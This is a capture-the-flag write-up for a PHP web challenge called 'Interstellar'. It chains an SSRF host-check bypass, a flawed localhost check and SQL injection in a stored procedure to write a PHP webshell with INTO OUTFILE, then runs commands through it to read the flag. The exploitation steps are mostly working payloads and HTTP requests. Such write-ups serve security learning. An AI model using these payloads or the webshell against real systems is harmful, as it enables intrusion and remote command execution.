# Interstellar - CTF Web Challenge Writeup

## Challenge Overview

**Challenge Name:** Interstellar  
**Category:** Web  
**Difficulty:** Medium

This challenge involves exploiting a PHP web application with multiple vulnerabilities. The application is a user management system where users can register, login, and communicate with their "motherland". The flag is stored in a randomly named file on the filesystem.

---

## Reconnaissance

### Application structure

The application has the following key endpoints:
- `/login.php` - User authentication
- `/register.php` - User registration
- `/index.php` - Main dashboard with user information
- `/communicate.php` - Feature to make HTTP requests to specific domains
- `/logout.php` - Session termination

### Database schema

```sql
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    username VARCHAR(20) NOT NULL UNIQUE,
    password VARCHAR(20) NOT NULL,
    planet VARCHAR(20) NOT NULL
);
```

The application uses MySQL stored procedures for database operations:
- `searchUser(name)` - Search user by name
- `registerUser(name, username, password, planet)` - Register new user
- `loginUser(username, password)` - Authenticate user
- `editName(id, new_name)` - Update user's name

---

## Vulnerabilities

### 1. SQL Injection in searchUser stored procedure

The `searchUser` stored procedure is vulnerable to SQL injection:

```sql
CREATE PROCEDURE searchUser(IN name VARCHAR(255))
BEGIN
    SET @sql = CONCAT('SELECT * FROM users WHERE name = \'', name, '\'');
    PREPARE stmt FROM @sql;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END
```

The `name` parameter is directly concatenated into the SQL query without sanitization. This allows an attacker to inject arbitrary SQL commands.

**Location:** Called in `index.php` line 15-24:

```php
$query = "CALL searchUser(?)";
$stmt = $conn->prepare($query);
$stmt->bind_param("s", $name);
$stmt->execute();
```

Although the PHP code uses prepared statements, the stored procedure itself concatenates the input unsafely.

### 2. SSRF (Server-Side Request Forgery) in communicate.php

The `communicate.php` endpoint allows users to make HTTP requests to URLs ending with `motherland.com`:

```php
$url = $_POST['url'];
$parsedUrl = parse_url($url);
if(preg_match('/motherland\.com$/', $parsedUrl['host'])) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $parsedUrl['host']);
    // ... makes the request
}
```

**Issue:** The validation only checks if the host ends with `motherland.com`, but the `CURLOPT_URL` is set to just the host component. This can be exploited using URL parsing tricks.

### 3. Localhost-Only edit function

The edit name function at `index.php?action=edit` has a flawed localhost check:

```php
if ($_SERVER['REMOTE_ADDR'] == '127.0.0.2') {
    $smarty->assign('error', "Only localhost can use this function!");
    exit();
}
```

**Issue:** The check blocks `127.0.0.2` but allows `127.0.0.1` and other localhost addresses.

---

## Exploitation

### Step 1: Register an account

First, register a normal user account:

```http
POST /register.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

name=test&username=test&password=test
```

The `name` parameter has some regex filtering, but it only removes special characters: `preg_replace('/[^a-zA-Z0-9]/', '', $name)`.

### Step 2: Login

Login with the created credentials:

```http
POST /login.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

This sets a `PHPSESSID` session cookie.

### Step 3: SQL Injection -> php webshell

The SQL injection vulnerability in `searchUser` can be exploited to write a PHP webshell using MySQL's `INTO OUTFILE`.

**Payload:**

```sql
test' UNION SELECT 1,2,3,4,"<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/backdoor.php"#
```

However, we need to inject this through the `name` field. Since we're already logged in, the `name` is taken from the session. We need to update our name using the edit function.

### Step 4: SSRF Bypass to access adit function

The edit function requires the request to come from localhost (except `127.0.0.2`). We can use the SSRF vulnerability in `communicate.php` to bypass this.

**SSRF Bypass Payload:**

```
0://127.0.0.1:80;motherland.com:80/
```

**Explanation:**
- The `parse_url()` function will parse this as:
  - `scheme`: `0`
  - `host`: `127.0.0.1:80;motherland.com:80`
- The regex `'/motherland\.com$/'` matches because the host ends with `motherland.com`
- However, when cURL processes `CURLOPT_URL` with just the host part, it interprets `127.0.0.1:80;motherland.com:80` and makes a request to `127.0.0.1:80` (the semicolon acts as a separator in some URL contexts)

**Request to trigger SSRF:**

```http
POST /communicate.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your_session>

url=0://127.0.0.1:80;motherland.com:80/&data[action]=edit&data[new_name]=test2' UNION SELECT 1,2,3,4,"<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/backdoor2.php"%23
```

**What happens:**
1. The SSRF makes a POST request to `http://127.0.0.1/` (index.php)
2. The request includes `action=edit` and `new_name` with SQL injection payload
3. The request comes from localhost, so it passes the `REMOTE_ADDR` check
4. The SQL injection updates the user's name in the database
5. Next time the user accesses the index, the `searchUser` procedure executes the injection

### Step 5: Trigger SQLI

After updating the name via SSRF, access the main page to trigger the SQL injection:

```http
GET / HTTP/1.1
Host: target
Cookie: PHPSESSID=<your_session>
```

This executes the `searchUser` procedure with the malicious name, writing the webshell to `/var/www/html/backdoor2.php`.

### Step 6: Execute commands via webshell

Access the webshell:

```http
GET /backdoor2.php?cmd=ls%20/ HTTP/1.1
Host: target
```

This will list the root directory where the flag file is located.

### Step 7: Read the flag

The flag is stored in a randomly named file in the root directory (format: `/<random_hex>_flag.txt`):

```http
GET /backdoor2.php?cmd=cat+/*_flag.txt HTTP/1.1
Host: target
```
